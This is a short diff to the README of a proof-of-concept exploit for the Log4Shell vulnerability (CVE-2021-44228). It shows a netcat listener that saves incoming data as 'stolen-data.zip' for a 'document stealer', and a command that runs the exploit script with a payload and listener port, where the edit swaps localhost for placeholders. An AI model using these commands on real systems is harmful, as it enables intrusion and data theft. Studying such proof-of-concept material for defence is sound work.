@@ -31,7 +31,7 @@ $ nc -lvnp 9001 > stolen-data.zip # For document stealer
 **Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
 
 ```bash
-$ python3 poc.py --userip localhost --webport 8000 --lport 9001 --payload /path/to/payload
+$ python3 poc.py --userip >>HOST_IP<< --webport 8000 --lport 9001 --payload >>/PATH/TO/PAYLOAD<<
 
 [!] CVE: CVE-2021-44228
 [!] Github repo: https://github.com/kozmer/log4j-shell-poc
